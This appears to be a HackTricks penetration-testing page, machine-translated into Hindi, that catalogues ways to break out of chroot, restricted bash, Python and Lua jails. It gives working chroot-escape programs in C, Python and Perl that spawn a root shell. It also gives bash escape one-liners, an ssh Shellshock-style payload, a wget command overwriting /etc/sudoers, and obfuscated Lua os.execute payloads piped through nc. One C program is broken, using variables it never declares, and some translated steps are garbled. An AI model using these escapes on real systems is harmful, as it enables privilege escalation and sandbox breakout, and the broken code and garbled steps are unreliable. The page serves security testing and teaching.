# जेल से भागना

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**खोजें** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **यदि आप "Shell" प्रॉपर्टी के साथ कोई बाइनरी निष्पादित कर सकते हैं**

## Chroot भागने

[विकिपीडिया](https://en.wikipedia.org/wiki/Chroot#Limitations) से: च्रूट तंत्र **जानबूझकर छेड़छाड़** के खिलाफ **विशिष्ट** (**रूट**) **उपयोगकर्ताओं** से **रक्षा** के लिए **नहीं है**। अधिकांश सिस्टम पर, च्रूट संदर्भ ठीक से स्टैक नहीं होते हैं और च्रूटेड प्रोग्राम **पर्याप्त विशेषाधिकार के साथ एक दूसरा च्रूट करने में सक्षम हो सकते हैं**।\
आमतौर पर इसका मतलब है कि भागने के लिए आपको च्रूट के अंदर रूट होना चाहिए।

> [!TIP]
> **उपकरण** [**chw00t**](https://github.com/earthquake/chw00t) को निम्नलिखित परिदृश्यों का दुरुपयोग करने और `chroot` से भागने के लिए बनाया गया था।

### रूट + CWD

> [!WARNING]
> यदि आप च्रूट के अंदर **रूट** हैं तो आप **दूसरा च्रूट** बनाकर **भाग सकते हैं**। इसका कारण यह है कि 2 च्रूट एक साथ नहीं रह सकते (Linux में), इसलिए यदि आप एक फ़ोल्डर बनाते हैं और फिर उस नए फ़ोल्डर पर **एक नया च्रूट** बनाते हैं जबकि **आप इसके बाहर हैं**, तो आप अब **नए च्रूट के बाहर** होंगे और इसलिए आप FS में होंगे।
>
> यह इसलिए होता है क्योंकि आमतौर पर च्रूट आपकी कार्यशील निर्देशिका को निर्दिष्ट स्थान पर नहीं ले जाता है, इसलिए आप एक च्रूट बना सकते हैं लेकिन इसके बाहर रह सकते हैं।

आमतौर पर आप च्रूट जेल के अंदर `chroot` बाइनरी नहीं पाएंगे, लेकिन आप **एक बाइनरी संकलित, अपलोड और निष्पादित** कर सकते हैं:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>पायथन</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>पर्ल</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### रूट + सहेजा गया fd

> [!WARNING]
> यह पिछले मामले के समान है, लेकिन इस मामले में **हमलावर वर्तमान निर्देशिका के लिए एक फ़ाइल वर्णनकर्ता को सहेजता है** और फिर **एक नए फ़ोल्डर में chroot बनाता है**। अंततः, चूंकि उसके पास chroot के **बाहर** उस **FD** तक **पहुँच** है, वह इसे एक्सेस करता है और वह **भाग निकलता है**।

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD को Unix Domain Sockets के माध्यम से पास किया जा सकता है, इसलिए:
>
> - एक चाइल्ड प्रोसेस बनाएं (fork)
> - UDS बनाएं ताकि पैरेंट और चाइल्ड बात कर सकें
> - चाइल्ड प्रोसेस में एक अलग फ़ोल्डर में chroot चलाएं
> - पैरेंट प्रोसेस में, एक FD बनाएं जो नए चाइल्ड प्रोसेस के chroot के बाहर है
> - UDS का उपयोग करके चाइल्ड प्रोसेस को वह FD पास करें
> - चाइल्ड प्रोसेस उस FD पर chdir करें, और क्योंकि यह अपने chroot के बाहर है, वह जेल से भाग जाएगा

### Root + Mount

> [!WARNING]
>
> - च्रूट के अंदर एक डायरेक्टरी में रूट डिवाइस (/) को माउंट करना
> - उस डायरेक्टरी में च्रूट करना
>
> यह Linux में संभव है

### Root + /proc

> [!WARNING]
>
> - च्रूट के अंदर एक डायरेक्टरी में procfs को माउंट करें (यदि यह अभी तक नहीं है)
> - एक pid देखें जिसमें एक अलग root/cwd एंट्री है, जैसे: /proc/1/root
> - उस एंट्री में च्रूट करें

### Root(?) + Fork

> [!WARNING]
>
> - एक Fork (चाइल्ड प्रोसेस) बनाएं और FS में गहरे एक अलग फ़ोल्डर में च्रूट करें और उस पर CD करें
> - पैरेंट प्रोसेस से, उस फ़ोल्डर को स्थानांतरित करें जहां चाइल्ड प्रोसेस च्रूट के बच्चों के च्रूट से पहले के फ़ोल्डर में है
> - यह चाइल्ड प्रोसेस खुद को च्रूट के बाहर पाएगा

### ptrace

> [!WARNING]
>
> - कुछ समय पहले उपयोगकर्ता अपने प्रोसेस को अपने ही प्रोसेस से डिबग कर सकते थे... लेकिन अब यह डिफ़ॉल्ट रूप से संभव नहीं है
> - फिर भी, यदि यह संभव है, तो आप एक प्रोसेस में ptrace कर सकते हैं और इसके अंदर एक shellcode निष्पादित कर सकते हैं ([इस उदाहरण को देखें](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

जेल के बारे में जानकारी प्राप्त करें:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH को संशोधित करें

जांचें कि क्या आप PATH env वेरिएबल को संशोधित कर सकते हैं
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim का उपयोग करना
```bash
:set shell=/bin/sh
:shell
```
### स्क्रिप्ट बनाएं

जांचें कि क्या आप _/bin/bash_ के रूप में सामग्री के साथ एक निष्पादन योग्य फ़ाइल बना सकते हैं।
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH के माध्यम से bash प्राप्त करें

यदि आप ssh के माध्यम से पहुँच रहे हैं, तो आप bash शेल निष्पादित करने के लिए इस ट्रिक का उपयोग कर सकते हैं:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### घोषित करें
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

आप उदाहरण के लिए sudoers फ़ाइल को ओवरराइट कर सकते हैं।
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### अन्य तरकीबें

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**यह पृष्ठ भी दिलचस्प हो सकता है:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python जेलें

पायथन जेलों से बचने के बारे में तरकीबें निम्नलिखित पृष्ठ पर:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua जेलें

इस पृष्ठ पर आप lua के अंदर आपके पास मौजूद वैश्विक कार्यों को पा सकते हैं: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**कमांड निष्पादन के साथ Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
कुछ तरकीबें **बिना डॉट का उपयोग किए लाइब्रेरी के फ़ंक्शन कॉल करने के लिए**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
एक पुस्तकालय के कार्यों की गणना करें:
```bash
for k,v in pairs(string) do print(k,v) end
```
ध्यान दें कि जब आप **अलग lua वातावरण में पिछले एक लाइनर को निष्पादित करते हैं तो कार्यों का क्रम बदल जाता है**। इसलिए यदि आपको एक विशिष्ट कार्य को निष्पादित करने की आवश्यकता है, तो आप विभिन्न lua वातावरणों को लोड करके और le library के पहले कार्य को कॉल करके एक ब्रूट फोर्स हमला कर सकते हैं:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**इंटरएक्टिव lua शेल प्राप्त करें**: यदि आप एक सीमित lua शेल के अंदर हैं, तो आप एक नया lua शेल (और उम्मीद है कि अनलिमिटेड) प्राप्त कर सकते हैं:
```bash
debug.debug()
```
## संदर्भ

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (स्लाइड: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
